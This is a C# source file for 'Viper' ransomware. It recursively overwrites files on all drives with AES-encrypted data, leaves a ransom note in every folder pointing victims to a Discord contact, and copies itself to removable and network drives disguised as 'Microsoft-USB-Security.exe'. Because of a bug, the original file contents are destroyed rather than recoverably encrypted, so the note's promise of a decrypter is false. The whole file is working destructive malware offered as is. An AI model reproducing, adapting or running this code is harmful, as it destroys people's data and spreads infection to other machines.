using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ConsoleApp1
{
	
    internal class Program
	{
		private static string vrn = "[Ransomware.Viper.A]\n\nQ. 1> WhAt tHe HeCK HapPEneD To mY fIlES?!\n A > Your files were encrypted by Viper Ransomware with military grade encryption AES-256.\n There is no way to brute force it since quantum computers aren't that fast.\n\nQ. 2>How to get back my files?\nA > Add Maschinenpistole 40#6508 to your friends in https://discord.com and wait for instructions.\n\n**NOTE** VIPER WAS CREATED FOR FUN AND NO PAYMENT IS REQUIRED, JUST CONTACT ME AND I WILL SEND YOU THE DECRYPTER. **DO NOT MODIFY THE FILES YOU IDIOT!!**";

		private static void Main(string[] args)
		{
			try
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				DriveInfo[] array = drives;
				foreach (DriveInfo driveInfo in array)
				{
					if (driveInfo.DriveType == DriveType.Removable || driveInfo.DriveType == DriveType.Network)
					{
						spread(driveInfo.Name.ToString());
					}
					if (driveInfo.Name.ToString() == "C:\\")
					{
						encryptAllDirectoryAndSubDirectoryFiles("C:\\Users\\" + Environment.UserName);
					}
					else
					{
						encryptAllDirectoryAndSubDirectoryFiles(driveInfo.Name.ToString());
					}
				}
			} catch(Exception) {}
		}

		public static string Encrypt(byte[] PlainText, byte[] Password,
			  string Salt = "ViperKnight", string HashAlgorithm = "SHA1",
			  int PasswordIterations = 2, string InitialVector = "OFRna73m*aze01xY",
			  int KeySize = 256)
		{
				if (string.IsNullOrEmpty(PlainText.ToString()))
					return "";
				byte[] InitialVectorBytes = Encoding.ASCII.GetBytes(InitialVector);
				byte[] SaltValueBytes = Encoding.ASCII.GetBytes(Salt);
				PasswordDeriveBytes DerivedPassword = new PasswordDeriveBytes(Password, SaltValueBytes, HashAlgorithm, PasswordIterations);
				byte[] KeyBytes = DerivedPassword.GetBytes(KeySize / 8);
				RijndaelManaged SymmetricKey = new RijndaelManaged();
				SymmetricKey.Mode = CipherMode.CBC;
				byte[] CipherTextBytes = null;
				using (ICryptoTransform Encryptor = SymmetricKey.CreateEncryptor(KeyBytes, InitialVectorBytes))
				{
					using (MemoryStream MemStream = new MemoryStream())
					{
						using (CryptoStream CryptoStream = new CryptoStream(MemStream, Encryptor, CryptoStreamMode.Write))
						{
							CryptoStream.Write(PlainText, 0, PlainText.Length);
							CryptoStream.FlushFinalBlock();
							CipherTextBytes = MemStream.ToArray();
							MemStream.Close();
							CryptoStream.Close();
						}
					}
				}
				SymmetricKey.Clear();
				return Convert.ToBase64String(CipherTextBytes);
		}

		private static void encrypt(string f)
		{
			try
			{
				string dte = File.ReadAllLines(f).ToString();
				string s = cp();
				string enc = Encrypt(Encoding.UTF8.GetBytes(dte), Encoding.UTF8.GetBytes(s));
				File.WriteAllBytes(f, Encoding.UTF8.GetBytes(enc));
			} catch(Exception) {}
		}

		private static string cp()
		{
			return "RansomwareViper";
		}

		private static void encryptAllDirectoryAndSubDirectoryFiles(string d)
		{
			try
			{
				if (d != "C:\\Users\\" + Environment.UserName + "\\AppData")
				{
					string[] files = Directory.GetFiles(d);
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						fileInfo.Attributes = FileAttributes.Normal;
						encrypt(files[i]);
					}

					File.WriteAllText(d + "\\Viper_README.RW-SK.txt", vrn);
					string[] directories = Directory.GetDirectories(d);
					for (int j = 0; j < directories.Length; j++)
					{
						encryptAllDirectoryAndSubDirectoryFiles(directories[j]);
					}
				}
				else {}
			} catch(Exception) {}
		}

		private static void spread(string dp)
		{
			try
			{
				File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, dp + "Microsoft-USB-Security.exe");
			}
			catch
			{
				string text = "lol idk what to do then";
			}
		}
	}
}
